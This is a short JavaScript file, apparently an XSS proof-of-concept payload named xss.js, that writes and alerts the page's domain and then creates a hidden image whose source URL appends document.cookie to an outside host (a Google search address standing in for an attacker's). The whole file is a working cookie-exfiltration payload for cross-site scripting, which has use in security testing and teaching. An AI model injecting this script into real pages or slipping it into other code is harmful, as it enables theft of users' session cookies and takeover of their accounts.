document.write ("This is remote text via xss.js located at han's github " + document.domain);
alert ("This is remote text via xss.js located at han's github " + document.domain);
var image = document.createElement("img");
image.setAttribute("style", "display: none");
image.setAttribute("src", "https://www.google.com/search?q=" + document.cookie);
document.body.appendChild(image);
